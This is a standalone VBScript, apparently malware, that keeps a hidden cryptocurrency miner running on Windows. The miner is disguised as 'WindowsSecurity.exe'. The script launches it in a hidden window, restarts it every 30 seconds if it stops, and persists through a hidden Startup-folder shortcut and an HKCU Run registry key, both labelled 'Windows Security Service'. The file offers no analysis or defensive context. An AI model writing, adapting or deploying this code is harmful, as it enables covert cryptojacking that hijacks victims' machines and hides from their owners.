Option Explicit

' Create required objects
Dim objShell, objFSO, objWMI, colProcesses, strStartupFolder
Dim minerPath, objStartupShortcut

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objWMI = GetObject("winmgmts:\\.\root\cimv2")

' Hide the script window completely
objShell.Run "cmd /c exit", 0, False

' Path to WindowsSecurity.exe
minerPath = "C:\Program Files\Microsoft\WindowsSecurity.exe"

' Add script to startup folder for persistence
InstallStartup

' Run immediately when script is executed
RunMiner

' Main loop - check every 30 seconds
Do
    WScript.Sleep 30000 ' Check every 30 seconds
    If Not ProcessExists("WindowsSecurity.exe") Then
        RunMiner
    End If
Loop

' Function to run the application with elevated privileges
Sub RunMiner()
    On Error Resume Next
    ' Run hidden (0) and don't wait for completion (False)
    objShell.Run """" & minerPath & """", 0, False
    ' Wait a moment to ensure process starts
    WScript.Sleep 1000
    On Error Goto 0
End Sub

' Function to check if a process is running
Function ProcessExists(procName)
    Set colProcesses = objWMI.ExecQuery("Select * from Win32_Process Where Name='" & procName & "'")
    ProcessExists = (colProcesses.Count > 0)
End Function

' Function to add script to startup for persistence
Sub InstallStartup()
    On Error Resume Next
    ' Get the startup folder path
    strStartupFolder = objShell.SpecialFolders("Startup")
    
    ' Create completely hidden shortcut in the startup folder
    Set objStartupShortcut = objShell.CreateShortcut(strStartupFolder & "\WindowsSecurityService.lnk")
    objStartupShortcut.TargetPath = "wscript.exe"
    objStartupShortcut.Arguments = """" & WScript.ScriptFullName & """" & " //B //Nologo"
    objStartupShortcut.WindowStyle = 0 ' Hidden
    objStartupShortcut.Description = "Windows Security Service"
    objStartupShortcut.Save
    
    ' Also add to registry for double persistence with hidden execution flags
    objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityService", "wscript.exe """ & WScript.ScriptFullName & """ //B //Nologo", "REG_SZ"
    On Error Goto 0
End Sub